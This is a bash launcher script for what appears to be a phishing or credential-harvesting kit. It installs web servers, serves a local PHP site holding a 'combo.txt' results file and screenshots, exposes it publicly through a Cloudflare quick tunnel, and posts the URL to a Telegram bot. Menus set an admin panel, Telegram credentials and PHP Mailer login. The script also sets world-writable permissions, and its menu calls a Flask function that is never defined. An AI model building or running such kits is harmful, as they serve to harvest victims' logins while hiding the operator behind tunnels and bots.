#!/bin/bash

# Create necessary directories and log files
mkdir -p .tunnels_log .host .pages .www/static/screenshots .www/results
touch .tunnels_log/.cloudfl.log
touch .www/results/combo.txt
touch .www/config.ini

# Colors for output
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"

# Function to install required packages
install_packages() {
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ $(command -v proot) ]]; then
            printf ''
        else
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Installing package : ${CYAN}proot${MAGENTA}${WHITE}"
            pkg install proot resolv-conf -y
        fi
    fi

    if [[ $(command -v php) && $(command -v wget) && $(command -v curl) && $(command -v unzip) && $(command -v apache2) && $(command -v nginx) && $(command -v npm) ]]; then
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Required packages already installed."
        sleep 1
    else
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Installing required packages...${WHITE}"
        
        if [[ $(command -v pkg) ]]; then
            pkg install figlet php curl wget unzip mpv apache2 nginx nodejs -y
        elif [[ $(command -v apt) ]]; then
            apt install figlet php curl wget unzip mpv apache2 nginx nodejs -y
        elif [[ $(command -v apt-get) ]]; then
            apt-get install figlet php curl wget unzip mpv apache2 nginx nodejs -y
        elif [[ $(command -v pacman) ]]; then
            sudo pacman -S figlet php curl wget unzip mpv apache2 nginx nodejs --noconfirm
        elif [[ $(command -v dnf) ]]; then
            sudo dnf -y install figlet php curl wget unzip mpv apache2 nginx nodejs
        else
            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, install packages manually."
            { sleep 2; exit 1; }
        fi
    fi
}

# Function to set up and start the local server
setup_clone_and_start_server() {
    cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
}

# Function to install tunnels and set up environment
install_tunnels_and_setup() {
    if [[ -f .host/cloudflared ]]; then
        clear
    else
        clear
        curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o .host/cloudflared
        chmod +x .host/cloudflared
    fi
}

# Function to set permissions
set_permissions() {
    chmod -R 777 packages.sh tunnels.sh .host .manual_attack .music .pages .tunnels_log .www
}

# Function to start Cloudflared
start_cloudflared() {
    echo -ne "\nStarting Cloudflared..."
    if [[ $(command -v termux-chroot) ]]; then
        termux-chroot ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
    else
        ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
    fi

    sleep 12

    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)

    if [[ -f .www/config.ini ]]; then
        TELEGRAM_TOKEN=$(grep 'token' .www/config.ini | cut -d '=' -f 2)
        TELEGRAM_CHAT_ID=$(grep 'chat_id' .www/config.ini | cut -d '=' -f 2)
        curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage -d text="Cloudflared URL: ${cldflr_url}" -d chat_id=${TELEGRAM_CHAT_ID} > /dev/null
    else
        echo "config.ini not found in .www folder. Cannot send URL to Telegram."
    fi
}

# Function to start White-Spikes JS server
start_white_spikes_server() {
    echo -ne "\nStarting White-Spikes JS server..."
    if [[ ! -d "white-spikes" ]]; then
        git clone https://github.com/madhanmaaz/white-spikes
    fi
    cd white-spikes
    npm install
    npm run start > ../.tunnels_log/.cloudfl.log 2>&1 &

    sleep 12

    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ../.tunnels_log/.cloudfl.log)
    echo "Server is running. Access it at: ${cldflr_url}"
}

# Function to find an available port
find_available_port() {
    local port=5000
    while netstat -tuln | grep -q ":$port "; do
        ((port++))
    done
    echo $port
}

# Main menu function
main_menu() {
    while true; do
        clear
        echo -e "${BLUE}============================"
        echo -e "      PRO-SARAH MENU"
        echo -e "============================${WHITE}"
        echo "1. Tools"
        echo "2. Settings"
        echo "3. Exit"
        echo -e "${BLUE}============================${WHITE}"
        read -p "Enter your choice: " main_choice

        case $main_choice in
            1)
                tools_menu
                ;;
            2)
                settings_menu
                ;;
            3)
                exit 0
                ;;
            *)
                echo "Invalid choice. Please try again."
                sleep 2
                ;;
        esac
    done
}

# Tools menu function
tools_menu() {
    while true; do
        clear
        echo -e "${BLUE}============================"
        echo -e "          TOOLS"
        echo -e "============================${WHITE}"
        echo "1. Start PHP Server"
        echo "2. Start JS Server (White-Spikes)"
        echo "3. Start Flask Server"
        echo "4. Go Back"
        echo -e "${BLUE}============================${WHITE}"
        read -p "Enter your choice: " tools_choice

        case $tools_choice in
            1)
                setup_clone_and_start_server
                start_cloudflared
                break
                ;;
            2)
                start_white_spikes_server
                start_cloudflared
                break
                ;;
            3)
                start_flask_server
                start_cloudflared
                break
                ;;
            4)
                break
                ;;
            *)
                echo "Invalid choice. Please try again."
                sleep 2
                ;;
        esac
    done
}

# Settings menu function
settings_menu() {
    while true; do
        clear
        echo -e "${BLUE}============================"
        echo -e "         SETTINGS"
        echo -e "============================${WHITE}"
        echo "1. Change Admin Panel Username and Password"
        echo "2. Change Telegram Bot Token and Chat ID"
        echo "3. Set up PHP Mailer Info"
        echo "4. Go Back"
        echo -e "${BLUE}============================${WHITE}"
        read -p "Enter your choice: " settings_choice

        case $settings_choice in
            1)
                read -p "Enter new admin username: " admin_username
                read -sp "Enter new admin password: " admin_password
                echo ""
                sed -i "s/^admin_username=.*/admin_username=${admin_username}/" .www/config.ini
                sed -i "s/^admin_password=.*/admin_password=${admin_password}/" .www/config.ini
                echo "Admin panel credentials updated."
                sleep 2
                ;;
            2)
                read -p "Enter new Telegram bot token: " telegram_token
                read -p "Enter new Telegram chat ID: " telegram_chat_id
                sed -i "s/^token=.*/token=${telegram_token}/" .www/config.ini
                sed -i "s/^chat_id=.*/chat_id=${telegram_chat_id}/" .www/config.ini
                echo "Telegram bot information updated."
                sleep 2
                ;;
            3)
                read -p "Enter PHP Mailer host: " mailer_host
                read -p "Enter PHP Mailer username: " mailer_username
                read -sp "Enter PHP Mailer password: " mailer_password
                echo ""
                sed -i "s/^mailer_host=.*/mailer_host=${mailer_host}/" .www/config.ini
                sed -i "s/^mailer_username=.*/mailer_username=${mailer_username}/" .www/config.ini
                sed -i "s/^mailer_password=.*/mailer_password=${mailer_password}/" .www/config.ini
                echo "PHP Mailer information updated."
                sleep 2
                ;;
            4)
                break
                ;;
            *)
                echo "Invalid choice. Please try again."
                sleep 2
                ;;
        esac
    done
}

# Main function to execute all steps
main() {
    install_packages
    install_tunnels_and_setup
    set_permissions

    main_menu
}

# Execute the main function
main
